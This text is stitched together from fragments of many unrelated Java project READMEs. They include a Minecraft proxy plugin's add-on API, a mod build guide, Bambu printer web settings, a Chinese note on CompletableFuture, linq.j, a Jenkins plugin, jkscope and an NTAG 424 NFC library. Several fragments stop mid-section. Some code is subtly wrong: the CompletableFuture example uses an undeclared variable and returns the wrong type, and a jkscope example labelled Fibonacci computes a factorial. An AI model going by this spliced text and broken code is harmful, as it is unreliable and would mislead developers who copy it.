    - This file allows you to define only the messages you want to change.
    - Messages that are not defined will be loaded from the language file set within the plugin.
- You can edit and then reload the plugin's language by using the `/ptero reload` command.
- Contributions via Pull Requests for additional language files are welcome.

## Information for Plugin Developers

### About Power Controllers

BungeePteroPower provides a Power Controller API for supporting platforms other than Pterodactyl.  
By creating add-ons, you can add power controllers for platforms other than Pterodactyl!

We also welcome pull requests for adding built-in power controllers!  
Ideally, we would like to support the following:
- Power controllers that can start servers locally
- Power controllers compatible with management software other than Pterodactyl.  
    For example, we would like to support the following:
    - PufferPanel
    - Minecraft Server Manager
    - MCSManager
    - MC Server Soft
    - AMP

### Creating Add-ons

- BungeePteroPower provides an API for integration with other plugins.
    - If you want to support platforms other than Pterodactyl, it is possible by implementing the API.
- You can use the BungeePteroPower API by adding dependencies.
    1. Add the JitPack repository inside the pom.xml of your add-on:
        ```xml
        <repositories>
            <repository>
                <id>jitpack.io</id>
                <url>https://jitpack.io</url>
            </repository>
        </repositories>
        ```
    2. Add BungeePteroPower as a dependency:
        ```xml
        <dependency>
            <groupId>com.github.Kamesuta</groupId>
            <artifactId>BungeePteroPower</artifactId>
            <version>version</version>
        </dependency>
        ```
    3. Add the dependency to your plugin.yml:
        ```yml
        depends:
          - BungeePteroPower
        ```
    4. Use the API:
        ```java
        import com.kamesuta.bungeepteropower.api.BungeePteroPowerAPI;

        public class YourPlugin extends JavaPlugin {
            @Override
            public void onEnable() {
                // Get an instance of BungeePteroPowerAPI
                BungeePteroPowerAPI api = BungeePteroPowerAPI.getInstance();
                // Register your custom PowerController
                api.registerPowerController(""your_service"", new YourPowerController());
            }
        }
        ```
        For an example implementation of a PowerController for Pterodactyl, please refer to [PterodactylController.java](./src/main/java/com/kamesuta/bungeepteropower/power/PterodactylController.java).
- If you want your PowerController to be added to BungeePteroPower, please send a pull request.

## Building
### Prerequisites
You will need to add a GitHub user and personal token to your gradle environment in order to access the required dependencies for building.
This should be added as properties into the `gradle.properties` file located in the `GRADLE_USER_HOME` directory.

Add the following properties:
```gradle
gpr.user=<USERNAME>
gpr.key=<GITHUB_PERSONAL_TOKEN>
```
### Data Generation
Generated files such as crafting recipes, blockstates, models, etc are not available out of the gate. You will need to generate them yourself before you build the mod. If you do not generate them, the outputed mod will be missing required data.

Run the following command to generate the data for each respective modloaders subproject
```
./gradlew :forge:Data :fabric:runDatagen :neoforge:runData 
```
### Building the JAR
To build the mod, simply run the following command. This will produce an artifact for common and all the modloader subprojects. The outputted artifacts will be located in `<subproject>/build/libs`.
```
./gradlew build
```
If you would like to target a specific modloader, you can simply run:
```
./gradlew :<modloader>:build
```
You can also generate the data in the same command
```
./gradlew :forge:Data :fabric:runDatagen :neoforge:runData  build
```
It is important to note that if you build the mod yourself, you will have an unsigned version of the mod. This just means that others will not be able to confirm if the mod has been modified. The officially hosted versions on mrcrayfish.com, CurseForge, and Modrinth have been signed will a private key.

1. **Currently only .3mf sliced projects are supported.**
  > In Bambu Studio/Orca slicer, make sure to slice the place and then use the ""File -> Export -> Export plate sliced file"". This creates a `.3mf` project with embedded `.gcode` plate.
2. **FTPS Connections needs SSL Session Reuse via [Bouncy Castle](#bouncy-castle)**
> Without enabling bouncy castle, you will see `552 SSL connection failed: session resuse required`
3. Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.
4. **Batch Priting** allows you to upload a single/multi sliced .3mf and select which plate to send to multiple printers, each with their own filament mapping.

bambu.remote-view=true

# defaults to true, when false, disables remote view for dashboard, but will still be available in detail view
bambu.dashboard.remote-view=true

# defaults to true, when false, disables per printer
bambu.printers.myprinter1.stream.enable=true
```


### Live View

Live View is the ability to remotely stream the X1C camera (or any other webcam) and requires Remote View to be enabled.

> [!NOTE]
> Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.


```properties
bambu.live-view-url=/_camerastream/

# For each printer:
bambu.printers.PRINTER_ID.stream.live-view=true

# Default LiveView URL
bambu.printers.PRINTER_ID.stream.url=${bambu.live-view-url}${PRINTER_ID}

# Custom LiveView URL
bambu.printers.PRINTER_ID.stream.url=https://my_stream_domain.com/mystream
# 
```


### Bouncy Castle
`X1C` needs SSL Session Reuse so that SD Card functionality can work. Reference: https://stackoverflow.com/a/77587106/23289205

Without this you will see `552 SSL connection failed: session resuse required`.

Add to `.env`:
```properties
bambu.use-bouncy-castle=true
```
Add JVM startup flag:

bash / cmd:
```bash
java -Djdk.tls.useExtendedMasterSecret=false -jar bambu-web-x.x.x-runner.jar
```

powershell:
```powershell
java ""-Djdk.tls.useExtendedMasterSecret=false"" -jar bambu-web-x.x.x-runner.jar
```

### Uploading bigger files

Add to `.env`:
```properties
quarkus.http.limits.max-body-size=30M
```

### Configure XY/Z movement speeds

Add to `.env`:
```properties
# values are in mm/minute
bambu.move-xy=5000
bambu.move-z=3000
```

### Use Right click for menus

Add to `.env`:
```properties
bambu.menu-left-click=false
```

### Custom CSS

If you want to modify the CSS, create a file next to the `.jar` file called `styles.css`

* Changing the display columns

*Display columns is a ratio and scale based on screen width*

Refer to [bambu.css](/bambu/frontend/themes/bambu-theme/bambu.css#L1-L25)

| Example | value for XXX |
| -- | -- |
| always 1 column | 1 |
| 2 columns with 1080p | 3 |
| 4 columns with 1080p | 5 |

```css
:root {
  --bambu-default-columns: XXX;
}
```

# Debug

For debugging the application, add the following to .env and uncomment DEBUG or TRACE logging sections

```properties
### Log To File
quarkus.log.file.enable=true
quarkus.log.file.path=application.log


### DEBUG logging
#quarkus.log.category.""com.tfyre"".level=DEBUG

# Usage and Enhance
## 1 Future change CompletaleFutue
Future:表示异步计算结果的接口

  我有一个任务，提交给了 Future 来处理。任务执行期间我自己可以去做任何想做的事情。并且，在这期间我还可以取消任务以及获取任务的执行状态。一段时间之后，我就可以 Future 那里直接取出任务执行结果。
  
  Future 在实际使用过程中存在一些局限性比如不支持异步任务的编排组合、获取计算结果的 get() 方法为阻塞调用。
  
CompletaleFutue: 基于事件驱动的异步回调类

  CompletableFuture 除了提供了更为好用和强大的 Future 特性之外，还提供了函数式编程、异步任务编排组合（可以将多个异步任务串联起来，组成一个完整的链式调用）等能力。


### 问题发现：


如果一个方法里面涉及到了 3 个 rpc 调用，假设每个 rpc 调用都需要 10ms，那么这个方法总耗时将不低于 30ms。

```JAVA
public boolean provingOrder(long userId, long itemId, double rate) {
    
    // 验证用户能否享受这一待遇，RPC调用
    boolean provingDiscount = provingService.proving(userId, itemId, rate);
    
    if(!provingDiscount) {
        // 该用户无法享受这一折扣
        return false;
    }
    
    // 获取药品单价，RPC调用
    double itemPrice = storeService.getPrice(itemId);
    
    // 用户实际应该支付的药品价格
    double realPrice = itemPrice * rate;
    
    // 获取用户账号历年余额，限定了只能使用历年余额购买，RPC调用
    double balance = userService.getBalance(userId);
            
    return realPrice <= balance;
}
```

在同步调用系统中，延迟同时会导致吞吐量的下降。如果只有一个线程，那么系统每秒的吞吐量将不会高于 1000ms / 30ms，也就是最多 33 qps。同步系统要提高吞吐量，唯一的办法就是加大线程数。同时启用 1,000 个线程，吞吐量理论值可以上升到 33,333 qps。不过实际使用中，这并不是完美的方案：增加线程数量会导致频繁的上下文切换，系统整体性能将会严重下降。


引入Future：3 个 rpc 调用可以同时进行了，系统延迟降低为之前的 1/3。不过延迟降低吞吐量的问题还是没有解决，依然需要通过增加线程数来提升吞吐量。
```Java
public boolean provingOrder(long userId, long itemId, double rate) {
  // 验证用户能否享受这一待遇，RPC调用
    Future<Boolean> provingDiscountFuture = discountService.proving(userId, itemId, rate);
    
   // 获取药品单价，RPC调用
    Future<Double> itemPriceFuture = storeService.getPrice(itemId);
    
 // 获取用户账号历年余额，限定了只能使用历年余额购买，RPC调用
    Future<Double> balanceFuture = userService.getBalance(userId);

    if(!provingDiscountFuture.get()) {
        // 该用户无法享受这一折扣
        return false;
    }

    // 用户实际应该支付的药品价格
    double realPrice = itemPriceFuture.get() * rate;

    // 用户账号历年余额
    double balance = balanceFuture.get();
            
    return realPrice <= balance;
}
```

引入CompletableFuture:延迟降低为原来 1/3，同时吞吐量也不会因为延迟而降低。非常完美，简单高效，CompletableFuture 绝对称得上是大杀器。在 rpc 异步调用这个问题上，没什么比 CompletableFuture 更适合的解决方案了。CompletableFuture 是 Doug Lea 的又一力作，彻底解决了 Future 的缺陷，把 Java 带入了异步响应式编程的新世界。
```Java
 
public boolean provingOrder(long userId, long itemId, double rate) {
  // 验证用户能否享受这一待遇，RPC调用
    Future<Boolean> provingDiscountFuture = discountService.proving(userId, itemId, rate);
    
   // 获取药品单价，RPC调用
    Future<Double> itemPriceFuture = storeService.getPrice(itemId);
    
 // 获取用户账号历年余额，限定了只能使用历年余额购买，RPC调用
    Future<Double> balanceFuture = userService.getBalance(userId);

return CompletableFuture
        .allOf(verifyDiscountFuture, itemPriceFuture, balanceFuture)
        .thenApply(v -> {
            if(!verifyDiscountFuture.get()) {
                // 该用户无法享受这一折扣
                return false;
            }

            // 用户实际应该支付的价格
            double realPrice = itemPriceFuture.get() * rate;

            // 用户账号余额
            double balance = balanceFuture.get();
                    
            return realPrice <= balance;
        });    
}
```

  demo1:列出一个小demo,具体部分见代码
  ```Java
private <T> CompletableFuture<T> handleResult(//
			final Request request, //
			final CompletableFuture<Response> future, //
			final Invoker<CompletableFuture<?>> failoverInvoker, //
			final MethodParam methodParam) {
```
## 2 Serializable and Deserialize  pull_in MethodParam

高性能的方法参数封装，减少自动装箱调用，通过字节码生成直接调用。

方法参数封装，用于序列化传输参数数据，其实现类会自动根据方法名称生成get/set方法。

```Java
public static Class<? extends MethodParam> createClass(Method method)
			throws CannotCompileException, NotFoundException {
		Objects.requireNonNull(method, ""method must not be null"");

		if (method.getParameterCount() == 0) {
			return EmptyMethodParam.class;
		}

		Class<? extends MethodParam> methodParamClass = methodParamClassMap.get(method);
		if (methodParamClass != null) {
			return methodParamClass;
		}

		synchronized (MethodParamClassFactory.class) {
			methodParamClass = methodParamClassMap.get(method);
			if (methodParamClass != null) {
				return methodParamClass;
			}

			methodParamClass = doCreateClass(method);
			methodParamClassMap.put(method, methodParamClass);
		}

		return methodParamClass;
	}
```
## 3
Dubbo 的消息格式
```Java
public class RpcInvocation implements Invocation, Serializable {
    private String methodName;
    private Class<?>[] parameterTypes;
    private Object[] arguments;
    ...
}
```
基本的内置服务，建立连接后需要调用,将方法以及参数封装成MethodParam类，固定死顺序，保证serviceId为预设值，为每个方法设置一个id存入ConcurrentHashMap.通过服务id获取invoker
```Java
	@Override
	public CompletableFuture<List<String>> getClassRegisterList() {
		return CompletableFuture.completedFuture(invokerFactory.getClassRegisterList());
	}
```

### Linq is Object oriented sql, linq is actually a query on the data in memory, enabling developers to write queries more easily. These query expressions look a lot like SQL

> You can join, filter, sort, and group data sources with minimal code. These operations can be combined in a single query to obtain more complex results

#### allows you to write Java code that manipulates in-memory data in the same way that you query a database, for example
- List, Array
- SQL result data
- CSV, XML, JSON document datasets
- Stream, File stream

#### Application Scenarios
- Result association for RPCS such as Feign/Dubbo during distributed development
- In-memory computation of heterogeneous system data
- Use code to organize SQL result data
- Sorted aggregation of multiple result objects with in-memory paging
- Semantic object transformation and mapping
- Clean code, no need for loops and branches to manipulate data
- Federated access across data sources

#### Operation syntax
`From` `Select` `Distinct`、`Join`、`Where`、`Group By`、`Order By`、`Limit`、`Offset`、`...`

#### Tips
⚠️ Note: The object field must have a get method to facilitate lambda lookup. It is recommended to use the **Lombok** @Getter annotation to quickly create get access to the field

#### How to Use
It has zero external dependencies and is only 50kb in size
```xml
<dependency>
    <groupId>xyz.erupt</groupId>
    <artifactId>linq.j</artifactId>
    <version>0.0.5</version>
</dependency>
```

#### Example 1
```javascript
var strings = Linq.from(""C"", ""A"", ""B"", ""B"").gt(Th::is, ""A"").orderByDesc(Th::is).write(String.class);
// [C, B, B]

var integers = Linq.from(1, 2, 3, 7, 6, 5).orderBy(Th::is).write(Integer.class);
// [1, 2, 3, 5, 6, 7]

var name = Linq.from(data)
    // left join
    .innerJoin(target, Target::getId, Data::getId)
    // where like
    .like(Data::getName, ""a"")
    // select name
    .select(Data::getName)
    // distinct
    .distinct()
    // order by 
    .orderBy(Data::getName)
    .write(String.class);

```

#### Example 2
```java
public class ObjectQuery{

    private final List<TestSource> source = http.get(""https://gw.alipayobjects.com/os/antfincdn/v6MvZBUBsQ/column-data.json"");

    private final List<TestSourceExt> target = mongodb.query(""db.target.find()"");

3. Go to http://localhost:8080/jenkins
4. Update the installed plugins.
5. Install [Pipeline](https://plugins.jenkins.io/workflow-aggregator/) plugin. It isn't added as a dependency of the plugin because it [isn't recommended](https://plugins.jenkins.io/workflow-aggregator/#plugin-content-developer-notes).
6. Add your [service account content](https://developers.google.com/checks/guide/integrate/cli/install-checks-cli#authenticate-service) into a [Jenkins credentials under Global domain](https://www.jenkins.io/doc/book/using/using-credentials/)
7. Create and run a pipeline (see [README](README.md) to find an example, and we suggest to use: `generateReport: false` at the beginning to make sure the authentication and other parameters are valid.)
8. if you want to upload an APK file, you can place an APK file at the root of this repository, and it'll be accessible with `binaryPath: './my-app.apk'`

### Run tests

run `mvn test` or when using [Intellij IDEA](https://www.jetbrains.com/idea/) you can open test files and run individual classes and/or tests.

## Architecture

The plugin focuses on running as a step within a pipeline. Here are a quick explanation of the files:

Classes that interact with Jenkins:

- [UploadToChecksStep](src/main/java/io/jenkins/plugins/googlechecks/UploadToChecksStep.java) is defining the parameters and name of the plugin
- [UploadToChecksStepExecution](src/main/java/io/jenkins/plugins/googlechecks/UploadToChecksStepExecution.java) is the code that the plugin runs

Classes that interact with Google Checks:

- [GoogleChecks](src/main/java/io/jenkins/plugins/googlechecks/GoogleChecks.java): manage communication with Google Checks API alongs with [models](src/main/java/io/jenkins/plugins/googlechecks/models) to define the API responses types
- [GoogleCredentialsHelper](src/main/java/io/jenkins/plugins/googlechecks/GoogleCredentialsHelper.java) and [GoogleCredentialsHelperFactory](src/main/java/io/jenkins/plugins/googlechecks/GoogleCredentialsHelperFactory.java) deal with Google authentication and the factory pattern help us mock the authenication when running tests

mytang0/brook,main,"# Brook

Brook is an orchestration engine, supports microservices and in-app logic (embedded use) orchestration. With the embedded mode, users can effortlessly build their own workflow orchestration engine.

## Getting started

In order to maximize the lightweight nature of the Brook engine, a deliberate separation is made between its core components (which depend solely on a few essential toolkits) and the middleware extensions using SPI (Service Provider Interface). Consequently, regardless of the application implementation framework, one can seamlessly rely on the engine JAR and initialize the relevant instances.

### Maven dependency

Specify the version appropriate for the project, see [releases](https://github.com/mytang0/brook/releases).
```xml
<properties>
    <dubbo.version>...</dubbo.version>
</properties>
```

#### Not using Spring

```xml
<dependencies>
    <dependency>

## Motivation

Inspired by the [Kotlin scope function](https://kotlinlang.org/docs/scope-functions.html) I want to make my Java code
more structured and readable.

## How to use

Java 8+ version required. The library has no dependencies. All you need is this (get the latest
version [here](https://github.com/evpl/jkscope/releases)).

Maven:

```xml

<dependency>
  <groupId>com.plugatar.jkscope</groupId>
  <artifactId>jkscope</artifactId>
  <version>2.3</version>
  <scope>compile</scope>
</dependency>
```

Gradle:

```groovy
dependencies {
  implementation 'com.plugatar.jkscope:jkscope:2.3'
}
```

## Docs

### JKScope interface methods

You need to implement `JKScope` interface to use these methods.

```
class MyObject implements JKScope<MyObject> { }
```

#### `letIt` and `also`

Both methods are the same and differ in the name only. Methods perform the function block on this object and return this
object.

```
MyDTO myDTO = new MyDTO().letIt(it -> {
  it.setProperty(""value"");
  it.setAnother(""another value"");
});

MyResource myResource = new MyResource().also(it -> it.init());
```

#### `takeIf` and `takeUnless`

`takeIf` method performs the function block on this object and returns `Opt` monad of this object if the condition is
met, or it returns empty `Opt` instance if the condition is not met. And `takeUnless` method has reverse logic.

```
new MyObject().takeIf(it -> it.getInt() > 10).takeUnless(it -> it.getInt() > 20).letIt(it -> System.out.println(it));
```

#### `letOut`

`letOut` method performs given function block on this object and returns result.

```
Integer value = new MyObject().letOut(it -> it.getInt());
```

#### `letOpt`

`letOpt` method performs given function block on this object and returns `Opt` monad of result.

```
new MyObject().letOpt(it -> it.getInt()).takeIf(it -> it > 10).letIt(it -> System.out.println(it));
```

### JKScope static methods

Import static methods you need or import them all at once.

```
import static com.plugatar.jkscope.JKScope.*;
```

#### `run`, `runCatching` and `runRec`

`run` just runs given function block, `runCatching` runs ignore any Throwable, `runRec` runs function block allowing
yourself to be called recursively.

`run` method simply runs given function block, `runCatching` runs ignore any thrown Throwable, `runRec` runs function
block, allowing itself to be called recursively.

```
run(() -> {
  System.out.println(""Hi"");
});

runCatching(() -> {
  System.out.println(""Hi"");
});

runRec(func -> {
  if (new Random().nextInt(0, 100) == 50) {
    func.run();
  }
});
```

#### `with`, `withInt`, `withLong`, `withDouble` and `withResource`

These methods perform given function block on given values.

```
with(value, it -> {
  System.out.println(value);
});

with(value1, value2, (v1, v2) -> {
  System.out.println(v1);
  System.out.println(v2);
});
```

`withResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `let` variations

`let`, `letInt`, `letLong` and `letDouble` returns result of function block.

```
String value = let(() -> {
  //...
  return ""val"";
});
```

`let`, `letInt`, `letLong` and `letDouble` methods can also receive a value, process it using a function block, and
return that value.

```
String value = let(""val"", it -> {
  System.out.println(it);
});
```

`letRec`, `letIntRec`, `letLongRec` and `letDoubleRec` accept initial value and allow you to process it recursively
returning the result.

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

`letWith`, `letIntWith`, `letLongWith`, `letDoubleWith` methods accept values and returning the result of function
block.

```
int value = letWith(""42"", it -> Integer.valueOf(it));
```

`letWithResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `opt` and `optNonNull`

`opt` returns `Opt` instance of given value, `optNonNull` returns `Opt` instance of given value of given value or
empty `Opt` instance if given value is null.

```
opt(value).takeNonNull().takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));

optNonNull(value).takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));
```

#### `lazy` and `lazyOfValue`

`lazy` returns `Lazy` instance with given initializer. `lazyOfValue` returns `Lazy` instance of given value.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### `Opt` object

The `Opt` monad is similar in meaning to Java `Optional`, but allows the null value.

`Opt` monad contains some `Optional` methods and scope functions methods.

```
String result = Opt.of(value).takeIf(it -> it.length() > 10).orElse("""");

String result = Opt.of(value).takeNonNull().orElseGet(() -> """");

String result = Opt.of(value).takeIf(it -> it.length() > 10).orElseThrow(() -> new IllegalArgumentException());
```

### `Lazy` object

`Lazy` represents a value with lazy initialization.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### Unchecked functions

All presented functions allow you to not process checked exceptions.

```
public static void main(String[] args) {
  URI uri = let(() -> new URI(""abc""));
}
```

### Examples

#### Collection initialization

```
Map<String, Integer> map = let(new HashMap<>(), it -> {
  it.put(""val1"", 1);
  it.put(""val2"", 2);
});

List<String> list = let(new ArrayList<>(), it -> {
  it.add(""val1"");
  it.add(""val2"");
});
```

#### Argument in a method chain

```
new MyBuilder()
  .setFirst(""first"")
  .setSecond(""second"")
  .setThird(let(() -> {
    //...
    return ""third"";
  }))
  .setFourth(""fourth"")
  .build()
```

#### Nth Fibonacci number

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

#### Method argument processing

```
public static String checkNonNullNonEmptyStr(String value) {
  return opt(value)
    .takeNonNull().throwIfEmpty(NullPointerException::new)
    .takeUnless(String::isEmpty).throwIfEmpty(IllegalArgumentException::new)
    .get();
}
```

#### Safe resources

```
class MyResource implements AutoCloseable {
  //...
}

withResource(new MyResource(), it -> {
  //...
});
```

    })
    .addListener(debugLoggingListener())
    .build();

assertThat(stateMachine.send(TestState.NO_FOOD).reached(TestState.FOOD_IS_READY)).isTrue();
```

# With stop words 

Get better results by removing language-specific stop words. 

Based on ISO provided list from https://github.com/stopwords-iso 

Current implementation supports English, French, German, Dutch, Italian and Spanish stop words.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH);
```

# With Stemming

Get better results by using stemming. 

Stemming maps different forms of the same word to a common ""stem"". 
For example, the English stemmer maps running, run, runs to run. 
So a search for 'running' would also find documents which only have the other forms.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH, new EnglishStemmer());
```

The default implementation uses the Porter2 stemmer from Snowball.  
You can add other Stemmer implementations, for example, CoreNLP or Lucene.

johnnyb/ntag424-java,main,"# NXP NTAG 424 DNA Library

NOTE - I consider the 1.0.X series to be ""still in development"" and breaking changes can occur at any time.
1.1.0 will be the first ""stable"" release.
This is due to a combination of factors, mostly centered around my inexperience with Java packaging and trying to get something to ""just work"".

This library is meant to help with handling the NXP NTAG 424 DNA chip.
Note that the library itself is completely hardware agnostic, and requires adding in a ""transceiver"" to manage the NFC hardware details.
See more about that in the Usage section.

Note that this is very much a work-in-progress and you should expect things to be moved around and renamed quite a bit for the time being.
The current API should not be considered stable.

This library is primarily based on the NXP document `NT4H2421Gx`, available [here](https://www.nxp.com/docs/en/data-sheet/NT4H2421Gx.pdf).
Page numbers (often referenced in the code) are from revision 3.0.

Note that this library was built almost entirely from the referenced documents.
I have no real experience with NFC, so I really don't know what is specific to this chip, to NXP generally, or to some other standard.
If you have suggestions on how to refactor this to support more NFC tags, I'm certainly open to it.

Note that there is a companion library for reading SUN messages that this chip can generate [here](https://github.com/johnnyb/nfc-sun-decoder).

Other important documents to read:

* Dna 424 Application Notes and hints, [NXP AN12196](https://www.nxp.com/docs/en/application-note/AN12196.pdf)
* Dna 424 LRP Mode Application Notes and hints, [NXP AN12321](https://www.nxp.com/docs/en/application-note/AN12321.pdf)

## Building

This library is built with Maven.  To build, just do:

```
mvn clean install
```

And it will produce a JAR file named `target/ntag424-VERSION.jar`. 

## Installing

To install, just copy the JAR built in the previous section into your JAR folder.  
For an Android project, this is usually in the `app/libs` directory.

## Example Android project

The `examples` directory has an Android project that uses this library.  It contains a built jar, but, if it ineeds updating, you can run `./copyjar.sh` out of that directory after doing an `mvn clean install` in the main directory to copy the new version in.

## Usage

The intended usage of this library is within an Android project, though it is written so that it could be used with non-Android NFC hardware.
Basic information about NFC tag reading in Android is available [here](https://developer.android.com/develop/connectivity/nfc/nfc).
Assuming that you have discovered a tag through an Intent (named `tagIntent` in the code below), you can use the library as follows:

```
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import net.bplearning.ntag424.Constants;
import net.bplearning.ntag424.DnaCommunicator;
import net.bplearning.ntag424.command.GetCardUid;
import net.bplearning.ntag424.encryptionmode.AESEncryptionMode;


...


Tag tag = tagIntent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
IsoDep iso = IsoDep.get(tag);
new Thread(() -> {
	try {
		iso.connect();

		// Connect the library to the Android tag transceiver
		DnaCommunicator communicator = new DnaCommunicator();
		communicator.setTransceiver((bytesToSend) -> iso.transceive(bytesToSend));

		// This is required to use the functionality of the chip.  It's a weird NFC thing.
		IsoSelectFile.run(communicator, IsoSelectFile.SELECT_MODE_BY_FILE_IDENTIFIER, Constants.DF_FILE_ID);

		// Try to authenticate with the factory key and start an encrypted session
		if(AESEncryptionMode.authenticateEV2(communicator, 0, Constants.FACTORY_KEY)) {
			// Run an encrypted command to get the Card UID
			byte[] cardUid = GetCardUid.run(communicator);
		} else {
			// Failed to authenticate
		}
	} catch(IOException e) {
		// Always expect IOExceptions - they can happen even from someone not holding the
		// tag in place long enough.
	}	
}).start();

```

The way the code works is that it is split into four basic parts:

1. The main DnaCommunicator class which handles packaging the commands for the communication channel, including encrypted session management.
2. Individual classes which each roughly correspond to a command in the spec.  These usually have one or more static methods named `run` which perform the task.  The first argument is always the DnaCommunicator object.  This was so that commands could be easily added without junking up the main DnaCommunicator class.  These currently reside in the `net.bplearning.ntag424.command` package.
3. Encryption mode classes.  These classes handle the actual encryption and MAC processing, with a static method that can be run to initiate the session.
4. Utility functions and constants.

## LRP Encryption

This library supports the LRP (leakage-resistant primitive) encryption mode.
However, you have to configure the tags to use LRP, and then, once they are in LRP mode, they *cannot* be switched back to AES mode.
To set a tag to LRP mode, authenticate (as shown above), and then do:
```
import net.bplearning.ntag424.command.SetCapabilities;

SetCapabilities.run(communicator, true);
```

After doing that, AES encryption mode will NOT be available on the tag, and you CANNOT get it back.
you will then need to change out your authentication function from `AESEncryptionMode.authenticateEV2` to `LRPEncryptionMode.authenticateLRP`.

The LRP encryption is based on the NXP Document `AN12304`, available [here](https://www.nxp.com/docs/en/application-note/AN12304.pdf).
Page numbers are from version 1.1.

Also note that there is a Go implementation of LRP available [here](https://github.com/johnnyb/gocrypto).

## Secure Dynamic Messaging (SDM)

This library has some utility functions for performing SDM and generating SUN (Secure Unique NFC) messages.

This is currently in flux, but the way it works right now is as follows:

1. Create an SDMSettings object
2. Set the file permissions on the SDMSettings object.
3. Create an NdefTemplateMaster object and set whether LRP is in use.
4. Create a structured URL using the components for SDM.
5. Pass the URL and the SDMSettings to the NdefTemplateMaster object and get the resulting file data.
6. Write the file data to the NDEF file.
7. Change the file settings on the NDEF file to use the new SDMSettings object.

Step 3 will probably be removed at some point and this functionality will be integrated into another class.  Probably.
We may also incorporate some special commands to make some of this easier.

Here is some example code:

```
// Generate a new SDMSettings object and set the access permissions
SDMSettings sdmSettings = new SDMSettings();
sdmSettings.sdmMetaReadPerm = Constants.ACCESS_EVERYONE; // Set to a key to get encrypted PICC data
sdmSettings.sdmFileReadPerm = Constants.ACCESS_KEY2;     // Used to create the MAC and Encrypt FileData
sdmSettings.sdmReadCounterRetrievalPerm = Constants.ACCESS_NONE; // Not sure what this is for

// Create the NDEF record and make appropriate updates to SDMSettings
byte[] ndefRecord = master.generateNdefTemplateFromUrlString(""https://www.example.com/{UID}{COUNTER}/{MAC}"", sdmSettings);

// Write the data to the NDEF file
WriteData.run(communicator, Constants.NDEF_FILE_NUMBER, ndefRecord);

// Get the existing file settings:
FileSettings ndeffs = GetFileSettings.run(communicator, Constants.NDEF_FILE_NUMBER);

// Make any modifications you would like to those settings/permissions
// ...

// Set the SDMSettings to the newly-created sdmSettings object
ndeffs.sdmSettings = sdmSettings;

// Make changes to the file
ChangeFileSettings.run(communicator, Constants.NDEF_FILE_NUMBER, ndeffs);
```

After this, your tag should be using SDM.  Note that the offsets will auto-expand to match the requirements of the template.
Template pieces include:

* `{UID}`: Mirror the UID here
* `{COUNTER}`: Mirror the SDM Read Counter here
* `{PICC}`: Put the encrypted PICC data here (encrypted with sdmMetaReadPerm key).  If set, be sure to set usesLrp on the NDefMasterTemplate object (affects the size of the PICC data).
* `{FILE}`: Put the encrypted secret data here (encrypted with sdmFileReadPerm key).  If set, be sure to set the fileDataLength of the NdefMasterTemplate object.
* `{MAC}`: Put the MAC data here.
* `^`: If set, this is the start of the location that will be used for MAC calculation.  If unset, it just becomes the location of the start of the MAC, indicating to only MAC the PICC data.  Or, if there is encrypted file data, it is set to be the start of the encrypted file data.

Personally, I like to use `{UID}{COUNTER}` and `{MAC}` rather than `{PICC}` because, if there is a connection issue with the Internet, I at least know what UID my tag was wanting to be, even if I can't fully validate it.

## SDM Validation

You can also use this library on the ""other side"" to validate SDM messages and read their contents.
For unencrypted PICC data, do the following:

```
PiccData picc = new PiccData(uid, readCounter, usesLrp);
```

If the UID is not mirrored, set it to null.  If the readCounter is not mirrored, set it to 0.

For encrypted PICC data, do the following:

```
PiccData picc = PiccData.decodeFromEncryptedBytes(encryptedBytes, key, usesLrp);
```

Note that the key for decrypting the PICC data can be a different key from validating the MAC / decrypting the file data.
Therefore, you have to set this key with `setMacFileKey()`.

Then, you can validate the MAC (use an empty byte array for the message if there isn't one):

```
picc.setMacFileKey(macFileKey);
picc.performShortMac(new byte[0]); // MAC on PICC-only data
picc.decryptFileData(filedata);
```

## SDM Setups

This section describes some common ways to configure SDM.
SDM has a lot of options, so just picking a starting point is sometimes difficult.

Personally, my preferred method is to create an NDEF URL that looks like this: ""https://www.example.com/tagread/{UID}{COUNTER}/{MAC}""

Basically, this puts the UID and counter in plaintext.
This means that if something is scanning but is not connected to the Internet, it can in fact read the UID off of the card from the URL.
But, if you are connected to the Internet, it can do additional validation.

For general purposes, I personally recommend any additional information be stored on the server and retrieved rather than encoded into the card.
It just makes life easier, because then you just have an NDEF record to deal with, and you can easily link the data to the card after-the-fact with minimal tooling.
Basically, you have a card programmer, and, after the cards are programmed with your keys/URL, you can use other devices to tie those cards to something, and they don't need your encryption keys to do it.


## Key diversification

Key diversification allows you to have a different key on each device so that if someone were to steal the keys from the tag (which is itself a very difficult thing to do) it would not help them to know the keys for the other tags.

On the other hand, for key diversification to work, you need to know *which* key is on *which* device.
The standard way of doing this is by having a single master key which gets diversified by doing a CMAC using the master key with a combination of the tag's UID and some additional data known as the ""diversification data"" (this is used mostly to make sure the data is long enough to get a good CMAC).

Generally, the diversification data is constructed as follows.  
First, decide on a ""system identifier"".
This is a few bytes which is often an ASCII-ized version of your application name.
If your application is named ""foo"" then your system identifier is `new byte[] {0x66, 0x6f, 0x6f}`.
Then, use the `KeyInfo` class to construct your key.
Note that there is also an ""application identifier"" available.
I am not clear what that is supposed to be, but the document this is based on (AN10922) uses the ""3-byte DESfire AID"" (0x3042F5) in its example, so that is the default here.

```
byte[] masterKey = new byte[]{ /* Your master key here */ };
KeyInfo keyInfo = new KeyInfo();
keyInfo.key = masterKey;
